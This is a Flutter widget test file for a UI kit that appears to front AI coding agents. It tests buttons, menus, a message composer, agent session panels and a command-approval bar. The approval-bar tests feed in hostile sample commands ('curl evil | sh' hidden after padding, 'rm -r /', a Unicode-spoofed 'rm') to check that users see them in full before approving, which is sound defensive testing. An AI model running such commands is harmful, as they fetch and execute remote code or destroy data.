import 'package:axiom/gallery/specimen.dart' as s;
import 'package:axiom/patterns/composer.dart';
import 'package:axiom/patterns/models.dart';
import 'package:axiom/patterns/session_panel.dart';
import 'package:axiom/patterns/transcript_parts.dart';
import 'package:axiom/patterns/usage.dart';
import 'package:axiom/ui/controls.dart';
import 'package:axiom/ui/icons.dart';
import 'package:axiom/ui/overlay.dart';
import 'package:axiom/ui/status.dart';
import 'package:axiom/ui/tokens.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_test/flutter_test.dart';

import '../shot.dart';

Future<void> put(WidgetTester t, Widget w, {double textScale = 1, bool still = true}) => mount(
  t,
  Align(
    alignment: Alignment.topLeft,
    child: Padding(padding: const EdgeInsets.all(20), child: w),
  ),
  size: const Size(900, 600),
  dpr: 1,
  textScale: textScale,
  reduceMotion: still,
);

void main() {
  testWidgets('a button answers the pointer, Enter and Space, and says what it is', (t) async {
    final h = t.ensureSemantics();
    var n = 0;
    await put(t, AxButton(label: 'Run', onPressed: () => n++));
    await t.tap(find.text('Run'));
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.sendKeyEvent(LogicalKeyboardKey.space);
    expect(n, 3);
    expect(
      t.getSemantics(find.bySemanticsLabel('Run')),
      isSemantics(
        label: 'Run',
        isButton: true,
        isEnabled: true,
        isFocusable: true,
        isFocused: true,
        hasTapAction: true,
      ),
    );
    h.dispose();
  });

  testWidgets('a disabled button takes neither focus nor taps, and says so', (t) async {
    final h = t.ensureSemantics();
    await put(t, const AxButton(label: 'Run', onPressed: null));
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.pump();
    expect(
      t.getSemantics(find.bySemanticsLabel('Run')),
      isSemantics(label: 'Run', isButton: true, hasEnabledState: true, isEnabled: false),
    );
    h.dispose();
  });

  testWidgets('switch and check toggle and report their state', (t) async {
    final h = t.ensureSemantics();
    bool a = false, b = false;
    await put(
      t,
      StatefulBuilder(
        builder: (_, set) => Column(
          children: [
            AxSwitch(label: 'A', value: a, onChanged: (v) => set(() => a = v)),
            AxCheck(label: 'B', value: b, onChanged: (v) => set(() => b = v)),
          ],
        ),
      ),
    );
    await t.tap(find.byType(AxSwitch));
    await t.tap(find.byType(AxCheck));
    await t.pump();
    expect([a, b], [true, true]);
    expect(t.getSemantics(find.bySemanticsLabel('A')), isSemantics(isToggled: true));
    expect(t.getSemantics(find.bySemanticsLabel('B')), isSemantics(isChecked: true));
    h.dispose();
  });

  testWidgets('segments and tabs move by arrow keys', (t) async {
    var v = 'a', i = 0;
    await put(
      t,
      StatefulBuilder(
        builder: (_, set) => Column(
          children: [
            AxSegments(
              label: 'S',
              items: const [('a', 'One', null), ('b', 'Two', null)],
              value: v,
              onChanged: (x) => set(() => v = x),
            ),
            AxTabs(
              tabs: const [('X', null), ('Y', '2')],
              index: i,
              onChanged: (x) => set(() => i = x),
            ),
          ],
        ),
      ),
    );
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowRight);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowRight);
    expect(v, 'b');
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowRight);
    expect(i, 1);
  });

  testWidgets('a main act that cannot be pressed keeps its place, in outline', (t) async {
    for (final (tone, outlined) in [
      (AxTone.primary, true),
      (AxTone.key, true),
      (AxTone.quiet, false),
    ]) {
      Size? size;
      for (final on in [true, false]) {
        await put(t, AxButton(label: 'Go', tone: tone, onPressed: on ? () {} : null));
        final got = t.getSize(find.byType(AxButton));
        size ??= got;
        expect(got, size, reason: '$tone');
        final borders = [
          for (final b in t.widgetList<DecoratedBox>(
            find.descendant(of: find.byType(AxButton), matching: find.byType(DecoratedBox)),
          ))
            if (b.decoration case BoxDecoration(:final Border border, color: null)) border,
        ];
        expect(borders, hasLength(!on && outlined ? 1 : 0), reason: '$tone, $on');
        for (final b in borders) {
          expect(b, Border.all(color: AxColors.dark.field.bezel));
        }
      }
    }
  });

  testWidgets('choosing a tab moves nothing but the mark', (t) async {
    var i = 0;
    await put(
      t,
      StatefulBuilder(
        builder: (_, set) => AxTabs(
          tabs: const [('Conversation', null), ('Changes', '3'), ('Terminal', null)],
          index: i,
          onChanged: (x) => set(() => i = x),
        ),
      ),
    );
    final before = t.getRect(find.text('Terminal').last);
    await t.tap(find.text('Changes').last);
    await t.pumpAndSettle();
    expect(t.getRect(find.text('Terminal').last).left, closeTo(before.left, 1.5));
  });

  testWidgets('a menu opens, moves, skips what is disabled, chooses, and returns focus', (t) async {
    var v = 'axiom';
    await put(
      t,
      StatefulBuilder(
        builder: (_, set) => AxSelect(
          label: 'Harness',
          items: s.harnesses,
          value: v,
          onChanged: (x) => set(() => v = x),
        ),
      ),
    );
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.pump();
    await t.pump();
    expect(find.byType(AxMenu<String>), findsOneWidget);
    expect(find.text('not found'), findsOneWidget, reason: 'it says why');
    for (var k = 0; k < 3; k++) {
      await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
      await t.pump();
    }
    // axiom → claude → codex → (opencode is disabled) → axiom
    await t.sendKeyEvent(LogicalKeyboardKey.arrowUp);
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.pump();
    expect(v, 'codex');
    expect(find.byType(AxMenu<String>), findsNothing);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.pump();
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.keyC);
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.escape);
    await t.pump();
    expect(find.byType(AxMenu<String>), findsNothing);
    expect(v, 'codex', reason: 'Escape chooses nothing');
    // Focus is back on the key.
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.pump();
    expect(find.byType(AxMenu<String>), findsOneWidget);
  });

  testWidgets('a menu closes on an outside click and stays inside the window', (t) async {
    await mount(
      t,
      Align(
        alignment: Alignment.bottomRight,
        child: AxSelect(label: 'Harness', items: s.harnesses, value: 'axiom', onChanged: (_) {}),
      ),
      size: const Size(400, 300),
      dpr: 1,
    );
    await t.tap(find.byType(AxSelect<String>));
    await t.pumpAndSettle();
    final r = t.getRect(find.byType(AxMenu<String>));
    expect(const Rect.fromLTWH(0, 0, 400, 300).contains(r.topLeft), isTrue);
    expect(r.right, lessThanOrEqualTo(400));
    await t.tapAt(const Offset(5, 5));
    await t.pumpAndSettle();
    expect(find.byType(AxMenu<String>), findsNothing);
  });

  testWidgets('a field takes text, shows its error, and refuses when disabled', (t) async {
    final c = TextEditingController();
    await put(
      t,
      SizedBox(
        width: 200,
        child: AxField(label: 'Port', controller: c, placeholder: '1234', error: 'Nothing answers'),
      ),
    );
    expect(find.text('1234'), findsOneWidget);
    await t.enterText(find.byType(EditableText), '8080');
    await t.pump();
    expect(c.text, '8080');
    expect(find.text('1234'), findsNothing);
    expect(find.text('Nothing answers'), findsOneWidget);
  });

  testWidgets('every account of a service is listed with where its numbers come from', (t) async {
    String? used;
    var link = 0;
    await mount(
      t,
      Align(
        alignment: Alignment.topRight,
        child: UsageKey(s.services.first, onUse: (id) => used = id, onLink: () => link++),
      ),
      size: const Size(900, 600),
      dpr: 1,
    );
    await t.tap(find.byType(UsageKey));
    await t.pumpAndSettle();
    for (final a in s.services.first.accounts) {
      expect(find.text(a.name), findsOneWidget);
      expect(find.textContaining(a.identity), findsWidgets);
      expect(find.textContaining(a.lane), findsWidgets);
    }
    expect(find.text('Estimated'), findsOneWidget);
    await t.tap(find.text('Team, work'));
    await t.pumpAndSettle();
    expect(used, 'c2');
    await t.tap(find.byType(UsageKey));
    await t.pumpAndSettle();
    await t.tap(find.text('Link another Claude account'));
    await t.pumpAndSettle();
    expect(link, 1);
  });

  testWidgets('an unknown level is never drawn as a number', (t) async {
    final h = t.ensureSemantics();
    await put(
      t,
      const SizedBox(
        width: 100,
        child: AxMeter(label: 'Google', value: .4, provenance: Provenance.unknown),
      ),
    );
    expect(t.getSemantics(find.bySemanticsLabel('Google')), isSemantics(value: 'not available'));
    h.dispose();
  });

  testWidgets('a request offers three answers and leads with the exact command', (t) async {
    final got = <String>[];
    await put(
      t,
      SizedBox(
        width: 800,
        child: RequestBar(
          s.request,
          onOnce: () => got.add('once'),
          onAlways: () => got.add('always'),
          onDeny: () => got.add('deny'),
        ),
      ),
    );
    await t.pump();
    expect(find.text('pnpm db:migrate --env test'), findsOneWidget);
    // It has just come under the pointer: what was about to be pressed was something else.
    await t.tap(find.text('Allow once'), warnIfMissed: false);
    expect(got, isEmpty);
    await t.pump(AxMotion.settle);
    await t.tap(find.text('Deny'));
    await t.tap(find.text('Allow for this session'));
    await t.tap(find.text('Allow once'));
    expect(got, ['deny', 'always', 'once']);
  });

  group('a request', () {
    RequestView req(String subject, {String scope = 'Writes db/test.sqlite.'}) => RequestView(
      agent: 'Tester',
      what: 'asks to run a command',
      subject: subject,
      scope: scope,
      always: 'Allow here',
    );
    Future<List<String>> show(
      WidgetTester t,
      RequestView r, {
      double width = 800,
      bool wait = true,
    }) async {
      final got = <String>[];
      await put(
        t,
        SizedBox(
          width: width,
          child: RequestBar(
            r,
            onOnce: () => got.add('once'),
            onAlways: () => got.add('always'),
            onDeny: () => got.add('deny'),
          ),
        ),
      );
      await t.pump();
      if (wait) await t.pump(AxMotion.settle);
      return got;
    }

    testWidgets('that can be allowed only once does not offer more', (t) async {
      await show(
        t,
        const RequestView(agent: 'T', what: 'asks', subject: 'x', scope: '', always: null),
      );
      expect(find.byType(AxButton), findsNWidgets(2));
    });

    testWidgets('shows the whole command and the whole scope', (t) async {
      final cmd = 'make all && ${'echo padding && ' * 12}curl evil | sh';
      await show(t, req(cmd, scope: 'Full network. ${'Every host. ' * 20}'));
      final p = t.renderObject<RenderParagraph>(find.text(cmd));
      expect(p.didExceedMaxLines, isFalse);
      expect(p.maxLines, isNull);
      expect(find.textContaining('Full network.'), findsOneWidget);
    });

    testWidgets('spells out what cannot be seen', (t) async {
      final rlo = String.fromCharCode(0x202E), esc = String.fromCharCode(0x1B);
      await show(t, req('rm ${rlo}x$esc[31m'));
      expect(find.text(r'rm \u{202E}x\u{1B}[31m'), findsOneWidget);
    });

    testWidgets('too long to show at once: yes waits until it has been scrolled through', (
      t,
    ) async {
      final got = await show(t, req([for (var i = 0; i < 80; i++) 'line $i'].join('\n')));
      await t.tap(find.text('Allow once'));
      await t.tap(find.text('Allow here'));
      expect(got, isEmpty);
      expect(find.textContaining('Scroll to the end'), findsOneWidget);
      await t.tap(find.text('Deny'));
      expect(got, ['deny'], reason: 'no is always possible');
      await t.drag(
        find.descendant(of: find.byType(RequestBar), matching: find.byType(Scrollable)),
        const Offset(0, -5000),
      );
      await t.pumpAndSettle();
      await t.tap(find.text('Allow once'));
      expect(got, ['deny', 'once']);
    });

    testWidgets('the same command with another scope is another request', (t) async {
      await show(t, req('make', scope: 'One file.'));
      final got = await show(t, req('make', scope: 'Full network. ${'Every host. ' * 400}'));
      expect(t.takeException(), isNull);
      await t.pump(const Duration(milliseconds: 600));
      await t.tap(find.text('Allow once'));
      expect(got, isEmpty);
    });

    testWidgets('is gone through and allowed by keyboard alone', (t) async {
      final got = await show(t, req([for (var i = 0; i < 80; i++) 'line $i'].join('\n')));
      await t.sendKeyEvent(LogicalKeyboardKey.tab);
      await t.pump();
      for (var i = 0; i < 40; i++) {
        await t.sendKeyEvent(LogicalKeyboardKey.pageDown);
        await t.pump();
      }
      await t.pump();
      for (var i = 0; i < 4 && got.isEmpty; i++) {
        await t.sendKeyEvent(LogicalKeyboardKey.tab);
        await t.pump();
        if (i == 2) await t.sendKeyEvent(LogicalKeyboardKey.enter);
      }
      expect(got, ['once']);
    });

    testWidgets('every word of it is whole and spelled out', (t) async {
      final rlo = String.fromCharCode(0x202E);
      await put(
        t,
        SizedBox(
          width: 800,
          child: RequestBar(
            RequestView(
              agent: 'T',
              what: 'asks to ${'do things and ' * 20}DELETE EVERYTHING',
              subject: 'x',
              scope: 'y',
              always: 'Allow ${rlo}here',
            ),
            onOnce: () {},
            onAlways: () {},
            onDeny: () {},
          ),
        ),
      );
      expect(find.textContaining('DELETE EVERYTHING'), findsOneWidget);
      expect(find.text(r'Allow \u{202E}here'), findsOneWidget);
    });

    testWidgets('a new request is not already seen', (t) async {
      await show(t, req('short'));
      final got = await show(t, req([for (var i = 0; i < 80; i++) 'line $i'].join('\n')));
      await t.pump(const Duration(milliseconds: 600));
      await t.tap(find.text('Allow once'));
      expect(got, isEmpty);
    });

    testWidgets('cannot be allowed before it has been laid out', (t) async {
      await t.pumpWidget(const SizedBox());
      final got = <String>[];
      final long = req([for (var i = 0; i < 80; i++) 'line $i'].join('\n'));
      Widget bar(RequestView r) => Directionality(
        textDirection: TextDirection.ltr,
        child: MediaQuery(
          data: const MediaQueryData(),
          child: Overlay.wrap(
            child: Ax(
              theme: const AxTheme(),
              child: RequestBar(
                r,
                onOnce: () => got.add('once'),
                onAlways: () => got.add('always'),
                onDeny: () {},
              ),
            ),
          ),
        ),
      );
      for (final r in [long, req('short'), long]) {
        await t.pumpWidget(bar(r));
        // The first frame of it: nobody has seen anything.
        expect(t.widget<AxButton>(find.widgetWithText(AxButton, 'Allow once')).onPressed, isNull);
        await t.pump();
        await t.pump(const Duration(milliseconds: 600));
      }
    });

    testWidgets('differs if anything in it does', (t) async {
      final a = req('make');
      RequestView other({
        String? agent,
        String? what,
        String? subject,
        String? scope,
        String? always,
      }) => RequestView(
        agent: agent ?? a.agent,
        what: what ?? a.what,
        subject: subject ?? a.subject,
        scope: scope ?? a.scope,
        always: always ?? a.always,
      );
      expect(other(), a);
      for (final o in [
        other(agent: 'x'),
        other(what: 'x'),
        other(subject: 'x'),
        other(scope: 'x'),
        other(always: 'x'),
      ]) {
        expect(o == a, isFalse);
      }
    });

    testWidgets('that takes the place of another is not answered by a click on that one', (
      t,
    ) async {
      await show(t, req('make'));
      final at = t.getCenter(find.text('Allow once'));
      final got = await show(t, req('rm -r /'), wait: false);
      await t.tapAt(at);
      expect(got, isEmpty);
      await t.pump(const Duration(milliseconds: 600));
      await t.tapAt(t.getCenter(find.text('Allow once')));
      expect(got, ['once']);
    });

    testWidgets('End goes to its end', (t) async {
      final got = await show(t, req([for (var i = 0; i < 80; i++) 'line $i'].join('\n')));
      await t.sendKeyEvent(LogicalKeyboardKey.tab);
      await t.pump();
      await t.sendKeyEvent(LogicalKeyboardKey.end);
      await t.pump();
      await t.pump();
      await t.tap(find.text('Allow once'));
      expect(got, ['once']);
    });
  });

  testWidgets('a menu of any length scrolls inside the window', (t) async {
    await mount(
      t,
      Align(
        alignment: Alignment.topLeft,
        child: AxSelect(
          label: 'Many',
          items: [for (var i = 0; i < AxNarrow.most; i++) AxMenuItem(i, 'Item $i')],
          value: 0,
          onChanged: (_) {},
        ),
      ),
      size: const Size(400, 300),
      dpr: 1,
    );
    await t.tap(find.byType(AxSelect<int>));
    await t.pumpAndSettle();
    expect(t.takeException(), isNull);
    for (var i = 1; i < AxNarrow.most; i++) {
      await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
      await t.pump();
    }
    await t.pumpAndSettle();
    expect(t.getRect(find.text('Item ${AxNarrow.most - 1}')).bottom, lessThanOrEqualTo(300));
  });

  testWidgets('a menu of very many is narrowed down by writing', (t) async {
    int? chosen;
    await mount(
      t,
      Align(
        alignment: Alignment.topLeft,
        child: AxSelect(
          label: 'Many',
          items: [for (var i = 0; i < 10000; i++) AxMenuItem(i, 'vendor/Model $i')],
          value: 9000,
          onChanged: (v) => chosen = v,
        ),
      ),
      size: const Size(400, 600),
      dpr: 1,
    );
    await t.tap(find.byType(AxSelect<int>));
    await t.pumpAndSettle();
    expect(t.takeException(), isNull);
    expect(find.textContaining('vendor/Model'), findsNWidgets(AxNarrow.most + 2));
    expect(find.text('vendor/Model 9000'), findsWidgets, reason: 'what is chosen is among them');
    expect(find.text('${10000 - AxNarrow.most - 1} more'), findsOneWidget);
    await t.enterText(find.byType(EditableText), 'model 777 ven');
    await t.pumpAndSettle();
    // 777, 7770 to 7779, 1777 to 9777: whatever holds it.
    expect(find.text('vendor/Model 777'), findsOneWidget);
    expect(find.text('vendor/Model 12'), findsNothing);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    await t.pumpAndSettle();
    expect(chosen, 1777);
    await t.tap(find.byType(AxSelect<int>));
    await t.pumpAndSettle();
    await t.enterText(find.byType(EditableText), 'no such');
    await t.pumpAndSettle();
    expect(find.text('None fits'), findsOneWidget);
  });

  testWidgets('a menu whose items change while it is open', (t) async {
    int? chosen;
    var items = [for (var i = 0; i < 4; i++) AxMenuItem(i, 'Item $i')];
    late StateSetter set;
    await mount(
      t,
      Align(
        alignment: Alignment.topLeft,
        child: StatefulBuilder(
          builder: (_, s) {
            set = s;
            return SizedBox(
              width: 300,
              child: AxMenu<int>(items: items, value: 2, onChosen: (v) => chosen = v),
            );
          },
        ),
      ),
      size: const Size(400, 400),
      dpr: 1,
    );
    await t.pumpAndSettle();
    // It had the focus and has moved: it still has it. A value that is there twice is one.
    set(
      () => items = [const AxMenuItem(7, 'New'), ...items.reversed, const AxMenuItem(3, 'Again')],
    );
    await t.pumpAndSettle();
    expect(t.takeException(), isNull);
    expect(find.text('Again'), findsNothing);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    expect(chosen, 2);
    await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    expect(chosen, 1);
    // What had it is gone.
    set(() => items = const [AxMenuItem(9, 'Only')]);
    await t.pumpAndSettle();
    expect(t.takeException(), isNull);
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    expect(chosen, 9);
    // What has just come under the pointer is not pressed.
    chosen = null;
    set(() => items = const [AxMenuItem(5, 'Other')]);
    await t.pump();
    await t.tap(find.text('Other'), warnIfMissed: false);
    expect(chosen, isNull);
    await t.pump(AxMotion.settle);
    await t.tap(find.text('Other'));
    expect(chosen, 5);
    set(() => items = const []);
    await t.pumpAndSettle();
    await t.sendKeyEvent(LogicalKeyboardKey.arrowDown);
    expect(t.takeException(), isNull);
  });

  testWidgets('Escape closes every popover, also one without a menu, and returns focus', (t) async {
    await mount(
      t,
      Align(
        alignment: Alignment.topRight,
        child: UsageKey(s.services.first, onUse: (_) {}, onLink: () {}),
      ),
      size: const Size(900, 600),
      dpr: 1,
    );
    for (final byMouse in [true, false]) {
      if (byMouse) {
        await t.tap(find.byType(UsageKey));
      } else {
        await t.sendKeyEvent(LogicalKeyboardKey.tab);
        await t.sendKeyEvent(LogicalKeyboardKey.enter);
      }
      await t.pumpAndSettle();
      expect(find.text('Team, work'), findsOneWidget);
      await t.sendKeyEvent(LogicalKeyboardKey.escape);
      await t.pumpAndSettle();
      expect(find.text('Team, work'), findsNothing);
    }
  });

  testWidgets('Escape as a control character closes a menu; shortcuts pass it by', (t) async {
    await put(t, AxSelect(label: 'Harness', items: s.harnesses, value: 'axiom', onChanged: (_) {}));
    await t.tap(find.byType(AxSelect<String>));
    await t.pumpAndSettle();
    await t.sendKeyEvent(LogicalKeyboardKey.escape, character: String.fromCharCode(27));
    await t.pumpAndSettle();
    expect(find.byType(AxMenu<String>), findsNothing);
  });

  testWidgets('a resized window closes what hung from its parts', (t) async {
    await put(t, AxSelect(label: 'Harness', items: s.harnesses, value: 'axiom', onChanged: (_) {}));
    await t.tap(find.byType(AxSelect<String>));
    await t.pumpAndSettle();
    t.view.physicalSize = const Size(500, 400);
    await t.pumpAndSettle();
    expect(find.byType(AxMenu<String>), findsNothing);
  });

  group('the composer', () {
    late List<String> sent;
    Future<void> show(WidgetTester t) async {
      sent = [];
      await put(
        t,
        SizedBox(
          width: 600,
          child: Composer(
            placeholder: 'Say',
            action: 'Queue',
            onSubmit: (s) {
              sent.add(s);
              return true;
            },
          ),
        ),
      );
      await t.tap(find.byType(EditableText));
      await t.pump();
    }

    testWidgets('Enter sends, Shift+Enter does not, the keypad works', (t) async {
      await show(t);
      await t.enterText(find.byType(EditableText), 'one');
      await t.sendKeyDownEvent(LogicalKeyboardKey.shiftLeft);
      await t.sendKeyEvent(LogicalKeyboardKey.enter);
      await t.sendKeyUpEvent(LogicalKeyboardKey.shiftLeft);
      expect(sent, isEmpty);
      await t.sendKeyEvent(LogicalKeyboardKey.enter);
      await t.enterText(find.byType(EditableText), 'two');
      await t.sendKeyEvent(LogicalKeyboardKey.numpadEnter);
      expect(sent, ['one', 'two']);
    });

    testWidgets('Enter belongs to an input method that is composing', (t) async {
      await show(t);
      t.testTextInput.updateEditingValue(
        const TextEditingValue(
          text: 'にほん',
          selection: TextSelection.collapsed(offset: 3),
          composing: TextRange(start: 0, end: 3),
        ),
      );
      await t.pump();
      await t.sendKeyEvent(LogicalKeyboardKey.enter);
      expect(sent, isEmpty);
      t.testTextInput.updateEditingValue(
        const TextEditingValue(text: '日本', selection: TextSelection.collapsed(offset: 2)),
      );
      await t.pump();
      await t.sendKeyEvent(LogicalKeyboardKey.enter);
      expect(sent, ['日本']);
    });

    testWidgets('a double click selects a word, a drag selects a stretch', (t) async {
      await show(t);
      await t.enterText(find.byType(EditableText), 'alpha beta gamma');
      await t.pump();
      final e = t.state<EditableTextState>(find.byType(EditableText));
      TextSelection sel() => e.textEditingValue.selection;
      final r = e.renderEditable;
      Offset at(int i) => r.localToGlobal(r.getLocalRectForCaret(TextPosition(offset: i)).center);
      await t.tapAt(at(8), kind: PointerDeviceKind.mouse);
      await t.pump(const Duration(milliseconds: 50));
      await t.tapAt(at(8), kind: PointerDeviceKind.mouse);
      await t.pumpAndSettle();
      expect(sel().textInside(e.textEditingValue.text).trim(), 'beta');
      await t.pump(const Duration(seconds: 1));
      final g = await t.startGesture(at(0), kind: PointerDeviceKind.mouse);
      await t.pump(const Duration(milliseconds: 50));
      await g.moveTo(at(3));
      await t.pump();
      await g.moveTo(at(5));
      await g.up();
      await t.pumpAndSettle();
      expect(sel().textInside(e.textEditingValue.text), 'alpha');
    });
  });

  testWidgets('an agent\'s keys are reached by keyboard and by screen reader', (t) async {
    final h = t.ensureSemantics();
    final done = <String>[];
    await put(
      t,
      SizedBox(
        width: 248,
        child: SessionPanel(
          session: s.session,
          selected: 'lead',
          onSelect: (_) {},
          onPause: (id) => done.add('pause $id'),
          onStop: (id) => done.add('stop $id'),
        ),
      ),
    );
    final node = t.getSemantics(find.bySemanticsLabel('Lead, Running'));
    expect(
      node.getSemanticsData().customSemanticsActionIds!.map(
        (i) => CustomSemanticsAction.getAction(i)!.label,
      ),
      containsAll(['Pause Lead', 'Stop Lead']),
    );
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.pump();
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.pump();
    await t.sendKeyEvent(LogicalKeyboardKey.enter);
    expect(done, ['pause lead']);
    h.dispose();
  });

  testWidgets('a field offers the clipboard on a right click; a disabled one takes no focus', (
    t,
  ) async {
    final c = TextEditingController(text: 'words');
    await put(
      t,
      Column(
        children: [
          const SizedBox(width: 200, child: AxField(label: 'Off', enabled: false)),
          SizedBox(
            width: 200,
            child: AxField(label: 'On', controller: c),
          ),
        ],
      ),
    );
    await t.sendKeyEvent(LogicalKeyboardKey.tab);
    await t.pump();
    expect(
      t.state<EditableTextState>(find.byType(EditableText).last).widget.focusNode.hasFocus,
      isTrue,
    );
    await t.tap(find.text('words'));
    await t.pump(const Duration(milliseconds: 400));
    await t.tapAt(
      t.getRect(find.text('words')).centerLeft + const Offset(12, 0),
      buttons: kSecondaryButton,
      kind: PointerDeviceKind.mouse,
    );
    await t.pumpAndSettle();
    expect(find.text('Select all'), findsOneWidget);
  });

  testWidgets('an agent\'s keys cover none of its words', (t) async {
    await put(
      t,
      SizedBox(
        width: 248,
        child: SessionPanel(
          session: s.session,
          selected: 'lead',
          onSelect: (_) {},
          onPause: (_) {},
          onStop: (_) {},
        ),
      ),
    );
    final g = await t.createGesture(kind: PointerDeviceKind.mouse);
    await g.addPointer(location: Offset.zero);
    await g.moveTo(t.getCenter(find.textContaining('Surveyor', findRichText: true).first));
    await t.pump();
    final keys = t.getRect(find.byType(AxButton).first).left;
    for (final w in ['Surveyor', 'Reading queue']) {
      expect(
        t.getRect(find.textContaining(w, findRichText: true).first).right,
        lessThanOrEqualTo(keys),
      );
    }
  });

  testWidgets('every state has its own shape', (t) async {
    final shapes = <String>{};
    for (final st in AgentState.values) {
      await put(t, AxLamp(st, key: ValueKey(st)));
      late List<int> px;
      await t.runAsync(() async {
        final r = t.renderObject<RenderRepaintBoundary>(
          find.descendant(of: find.byType(AxLamp), matching: find.byType(RepaintBoundary)),
        );
        final img = await r.toImage(pixelRatio: 2);
        final d = (await img.toByteData())!;
        // Alpha only: the colour does not count.
        px = [for (var i = 3; i < d.lengthInBytes; i += 4) d.getUint8(i) > 100 ? 1 : 0];
      });
      shapes.add(px.join());
    }
    expect(shapes.length, AgentState.values.length);
  });

  testWidgets('a session holds its agents; keys appear on hover', (t) async {
    final picked = <String>[], paused = <String>[];
    await put(
      t,
      SizedBox(
        width: 248,
        child: SessionPanel(
          session: s.session,
          selected: 'builder',
          onSelect: picked.add,
          onPause: paused.add,
          onStop: (_) {},
        ),
      ),
    );
    expect(find.byType(AgentRow), findsNWidgets(6));
    await t.tap(find.textContaining('Surveyor', findRichText: true).first);
    expect(picked, ['surveyor']);
    expect(find.bySemanticsLabel('Pause Lead'), findsNothing);
    final g = await t.createGesture(kind: PointerDeviceKind.mouse);
    await g.addPointer(location: Offset.zero);
    await g.moveTo(t.getCenter(find.textContaining('Lead', findRichText: true).first));
    await t.pump();
    await t.tap(find.byType(AxButton).first);
    expect(paused, ['lead']);
  });

  testWidgets('the thumb of a trough is under what is chosen, and slides there', (t) async {
    var i = 0;
    Future<void> show({required bool still}) => put(
      t,
      StatefulBuilder(
        builder: (_, set) => AxTabs(
          tabs: const [('Conversation', null), ('Changes', '3'), ('Terminal', null)],
          index: i,
          onChanged: (x) => set(() => i = x),
        ),
      ),
      still: still,
    );
    await show(still: true);
    await t.tap(find.text('Terminal'));
    await t.pump();
    expect(i, 2);
    expect(t.binding.hasScheduledFrame, isFalse, reason: 'reduced motion jumps');
    await show(still: false);
    await t.tap(find.text('Conversation'));
    await t.pump();
    await t.pump(const Duration(milliseconds: 16));
    expect(i, 0, reason: 'chosen at once');
    expect(t.binding.hasScheduledFrame, isTrue, reason: 'and on its way');
    await t.pumpAndSettle();
    expect(t.takeException(), isNull);
  });

  testWidgets('a plan says how far it is, and how each part stands', (t) async {
    await put(
      t,
      SizedBox(
        height: 500,
        child: Builder(builder: (c) => SidePanel(groups: [planGroup(c, s.session.tasks)])),
      ),
    );
    expect(find.byType(TaskRow), findsNWidgets(7));
    expect(find.text('4 of 7'), findsOneWidget);
    expect(find.bySemanticsLabel('Single-flight guard, active, Builder'), findsOneWidget);
    expect(find.bySemanticsLabel('Failing test, done, Tester'), findsOneWidget);
  });

  testWidgets('reduced motion stops the lamp', (t) async {
    await put(t, const AxLamp(AgentState.running));
    expect(t.binding.hasScheduledFrame, isFalse);
    await put(t, const AxLamp(AgentState.running, key: ValueKey(1)), still: false);
    await t.pump(const Duration(milliseconds: 100));
    expect(t.binding.hasScheduledFrame, isTrue);
  });

  for (final scale in [1.0, 2.0]) {
    testWidgets('nothing overflows at $scale× text', (t) async {
      await put(
        t,
        SizedBox(
          width: 820,
          child: Column(
            children: [
              RequestBar(s.request, onOnce: () {}, onAlways: () {}, onDeny: () {}),
              Wrap(
                children: [
                  AxButton(label: 'A longer label', icon: AxIcon.send, onPressed: () {}),
                  const AxKeycap('⌘K'),
                ],
              ),
            ],
          ),
        ),
        textScale: scale,
      );
      expect(t.takeException(), isNull);
    });
  }

  testWidgets('density changes control height, never type', (t) async {
    final sizes = <double>[];
    for (final d in AxDensity.values) {
      await mount(
        t,
        Center(
          child: AxButton(label: 'Run', onPressed: () {}),
        ),
        theme: AxTheme(density: d),
        dpr: 1,
      );
      sizes.add(t.getSize(find.byType(AxButton)).height);
      final p = t.renderObject<RenderParagraph>(find.text('Run'));
      expect(p.text.style!.fontSize, 12.5);
    }
    expect(sizes, [24, 28, 32]);
  });
}
